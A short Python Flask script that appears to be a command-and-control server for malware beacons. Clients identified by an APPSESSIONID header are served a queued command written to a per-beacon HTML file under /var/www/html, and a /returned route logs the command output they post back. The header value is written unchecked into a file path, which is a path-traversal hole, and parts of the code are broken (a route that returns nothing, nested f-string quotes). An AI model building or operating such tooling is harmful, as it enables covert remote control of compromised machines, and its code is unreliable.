from flask import *

app = Flask(__name__)

@app.route("/")
def home():
    # Grab the appsessionid value from the headers
    val = request.headers['APPSESSIONID']
    print(f'headers:{val}')
    # create a new page for the UUID we got from the headers
    f = open(f"/var/www/html/{val}.html", "a")
    f.write("cmd;timeout 2;null ")
    f.close()
    return('found')

@app.route("/returned")
def results():
    print(f'Result: {request.data}')
    print(f'From beacon: {request.headers['APPSESSIONID']}')
if __name__=="__main__":
   app.run(debug=True)
